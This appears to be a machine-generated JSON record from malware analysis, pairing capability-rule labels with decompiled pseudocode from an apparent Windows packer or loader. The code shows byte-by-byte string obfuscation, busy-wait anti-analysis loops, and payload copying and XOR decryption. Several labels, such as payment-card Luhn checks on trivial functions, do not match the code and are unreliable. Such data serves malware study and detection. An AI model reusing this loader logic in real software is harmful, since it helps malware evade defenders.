{
    "0041e060": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0041e060(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    *0x429f34 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    *0x429f2c = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n    *0x429f10 = 0;\n    **0x429ea8 = 0x6a;\n    (*0x429ea8)[*0x429f10 + 1] = 0x6f;\n    (*0x429ea8)[*0x429f10 + 2] = 0x75;\n    (*0x429ea8)[*0x429f10 + 3] = 0x66;\n    (*0x429ea8)[*0x429f10 + 4] = 0x73;\n    (*0x429ea8)[*0x429f10 + 5] = 0x67;\n    (*0x429ea8)[*0x429f10 + 6] = 0x62;\n    (*0x429ea8)[*0x429f10 + 7] = 100;\n    (*0x429ea8)[*0x429f10 + 8] = 0x66;\n    (*0x429ea8)[*0x429f10 + 9] = 0x5d;\n    (*0x429ea8)[*0x429f10 + 10] = 0x7c;\n    (*0x429ea8)[*0x429f10 + 0xb] = 0x62;\n    (*0x429ea8)[*0x429f10 + 0xc] = 0x62;\n    (*0x429ea8)[*0x429f10 + 0xd] = 0x36;\n    (*0x429ea8)[*0x429f10 + 0xe] = 99;\n    (*0x429ea8)[*0x429f10 + 0xf] = 0x37;\n    (*0x429ea8)[*0x429f10 + 0x10] = 0x62;\n    (*0x429ea8)[*0x429f10 + 0x11] = 0x39;\n    (*0x429ea8)[*0x429f10 + 0x12] = 0x31;\n    (*0x429ea8)[*0x429f10 + 0x13] = 0x2e;\n    (*0x429ea8)[*0x429f10 + 0x14] = 99;\n    (*0x429ea8)[*0x429f10 + 0x15] = 0x39;\n    (*0x429ea8)[*0x429f10 + 0x16] = 0x34;\n    (*0x429ea8)[*0x429f10 + 0x17] = 0x35;\n    (*0x429ea8)[*0x429f10 + 0x18] = 0x2e;\n    (*0x429ea8)[*0x429f10 + 0x19] = 0x32;\n    (*0x429ea8)[*0x429f10 + 0x1a] = 0x32;\n    (*0x429ea8)[*0x429f10 + 0x1b] = 0x65;\n    (*0x429ea8)[*0x429f10 + 0x1c] = 0x31;\n    (*0x429ea8)[*0x429f10 + 0x1d] = 0x2e;\n    (*0x429ea8)[*0x429f10 + 0x1e] = 0x3a;\n    (*0x429ea8)[*0x429f10 + 0x1f] = 0x34;\n    (*0x429ea8)[*0x429f10 + 0x20] = 0x33;\n    (*0x429ea8)[*0x429f10 + 0x21] = 0x67;\n    (*0x429ea8)[*0x429f10 + 0x22] = 0x2e;\n    (*0x429ea8)[*0x429f10 + 0x23] = 0x31;\n    (*0x429ea8)[*0x429f10 + 0x24] = 0x31;\n    (*0x429ea8)[*0x429f10 + 0x25] = 0x62;\n    (*0x429ea8)[*0x429f10 + 0x26] = 0x31;\n    (*0x429ea8)[*0x429f10 + 0x27] = 100;\n    (*0x429ea8)[*0x429f10 + 0x28] = 0x3a;\n    (*0x429ea8)[*0x429f10 + 0x29] = 0x31;\n    (*0x429ea8)[*0x429f10 + 0x2a] = 0x65;\n    (*0x429ea8)[*0x429f10 + 0x2b] = 100;\n    (*0x429ea8)[*0x429f10 + 0x2c] = 0x62;\n    (*0x429ea8)[*0x429f10 + 0x2d] = 0x62;\n    (*0x429ea8)[*0x429f10 + 0x2e] = 0x3a;\n    (*0x429ea8)[*0x429f10 + 0x2f] = 0x7e;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    (*0x429ea8)[*0x429f10 + 0x30] = 1;\n    for (*0x429f10 = 0; *0x429f10 < 0x31; *0x429f10 = *0x429f10 + 1) {\n        (*0x429ea8)[*0x429f10] = (*0x429ea8)[*0x429f10] + -1;\n    }\n    iVar1 = (**0x429f34)(*0x429e20 + -300, *0x429ea8, 0x429f4c, param_1);\n    if (iVar1 == 0) {\n        return;\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 2584
    },
    "0041e910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0041e910(void)\n\n{\n    int32_t iVar1;\n    uint var_1354h;\n    uint var_1350h;\n    uint var_134ch;\n    uint var_1207h;\n    uint var_11e7h;\n    uint var_1074h;\n    uint var_ffch;\n    uint var_f7fh;\n    uint var_d90h;\n    uint var_c0dh;\n    uint var_ba5h;\n    uint var_aceh;\n    uint var_857h;\n    uint var_802h;\n    uint var_731h;\n    uint var_5d2h;\n    uint var_4b9h;\n    uint var_3c5h;\n    uint var_179h;\n    uint var_156h;\n    uint var_144h;\n    uint var_140h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_4h = 0x41e91d;\n    fcn.0041f3b0();\n    var_ch = 0x12c;\n    var_4h = 0;\n    var_8h = 0x41e93a;\n    *0x429ef8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    *0x429f40 = *(*0x429ef8 + 0x3c);\n    do {\n        while( true ) {\n            var_8h = &fcn.0041e910::var_ch;\n            var_ch = &fcn.0041e910::var_140h;\n            puStack20 = &fcn.0041e910::var_4h;\n            uStack24 = 0;\n            uStack28 = 0x429f1c;\n            uStack32 = *0x429f4c;\n            uStack36 = 0x41e99b;\n            iVar1 = (**0x429f2c)();\n            if (iVar1 == 0) break;\n            var_8h = 0x41e9a4;\n            fcn.0041e910();\n        }\n    } while (var_140h._1_1_ != 'A');\n    if (var_140h._3_1_ == 't') {\n        *0x429f24 = 0x40472d;\n    }\n    *0x429f24 = *0x429f24 + -0x3728;\n    if (var_140h._3_1_ == '1') {\n        *0x429f24 = 0x4024ca;\n    }\n    *0x429f24 = *0x429f24 + -1;\n    *0x429eac = *0x429eac - 0x14d;\n    if ((*0x429ef8 < *0x429eac) && (*0x429eac < *0x429ef8 + *(*0x429ef8 + *0x429f40 + 0x50))) {\n        *0x429ed0 = 0;\n    }\n    else {\n        *0x429ef8 = *0x429efc;\n        *0x429ed0 = 1;\n    }\n    return *0x429f24;\n}\n",
        "token_count": 747
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl entry0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    uint var_14h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    *0x429edc = &stack0xfffffffc;\n    *0x429efc = arg_8h;\n    for (var_4h = 0x15; var_4h < 0x1dab7c7; var_4h = var_4h + 1) {\n    }\n    fcn.0041e900(0x11aa);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e900(0x14eb);\n    fcn.0041e900(0x28e);\n    fcn.0041e060();\n    fcn.0041ee00();\n    fcn.0041eef0(2);\n    *0x429ee8 = 0;\n    *0x429eec = 0;\n    *0x429ee4 = 5;\n    do {\n        arg_8h_00 = fcn.0041e8a0(*0x429e2c, *0x429ec8);\n        if (*0x429ec4 <= *0x429ee8) break;\n        fcn.0041e810(arg_8h_00);\n        *0x429eec = *0x429ee4 + *0x429e2c + *0x429eec;\n        *0x429ee8 = *0x429e2c + *0x429ee8;\n        *0x429ec8 = *0x429ec8 - arg_8h_00;\n        *0x429ecc = arg_8h_00;\n    } while (*0x429f08 != 0);\n    fcn.0041e7f0();\n    puVar1 = *0x429edc;\n    **0x429edc = *0x429ef8;\n    puVar1[-1] = *0x429ed0;\n    uVar2 = *0x429f10;\n    puVar1[-2] = *0x429ed4;\n    return uVar2;\n}\n",
        "token_count": 685
    },
    "0041ed80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0041ed80(void)\n\n{\n    uint var_8e7h;\n    uint var_86bh;\n    uint var_798h;\n    uint var_594h;\n    uint var_426h;\n    uint var_31eh;\n    uint var_27dh;\n    uint var_25dh;\n    uint var_aeh;\n    uint var_4h;\n    \n    return *(*0x429f04 + -4);\n}\n",
        "token_count": 97
    },
    "0041df40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041df40(void)\n\n{\n    *0x429f38 = *0x429f20 - 1;\n    *0x429f48 = **0x429f3c ^ *0x429f20;\n    *0x429f28 = *0x429f48;\n    **0x429f3c = *0x429f48;\n    return;\n}\n",
        "token_count": 88
    },
    "0041e040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041e040(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h * 0x229;\n}\n",
        "token_count": 43
    },
    "0041e7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e7f0(void)\n\n{\n    fcn.0041ee50(0x2a, 0x1100);\n    return;\n}\n",
        "token_count": 38
    },
    "0041e810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e810(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x429f08 + *0x429ee8;\n    iVar2 = *0x429f04 + *0x429eec;\n    for (var_8h = 0; var_8h < arg_8h; var_8h = var_8h + 1) {\n        *(iVar1 + var_8h) = 0;\n        *(iVar1 + var_8h) = *(iVar2 + var_8h);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0041e900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041e900(int32_t arg_8h)\n\n{\n    return arg_8h + 0x13f7;\n}\n",
        "token_count": 37
    },
    "0041ee00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ee00(void)\n\n{\n    *0x429f04 = fcn.0041e910();\n    *0x429ec4 = fcn.0041ed80(1);\n    *0x429f10 = *0x429ec4;\n    return;\n}\n",
        "token_count": 65
    },
    "0041ee50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ee50(void)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (*0x429ec4 == 0) {\n        return;\n    }\n    *0x429f50 = *0x429f08;\n    fcn.0041f110(0x45b, 0);\n    *0x429f20 = 4;\n    *0x429f3c = *0x429f50;\n    *0x429f44 = *0x429f3c;\n    fcn.0041df40(&stack0xfffffffc, 0x41eed3);\n    return;\n}\n",
        "token_count": 164
    },
    "0041e8a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041e8a0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < arg_ch) {\n        arg_ch = arg_8h;\n    }\n    return arg_ch;\n}\n",
        "token_count": 79
    }
}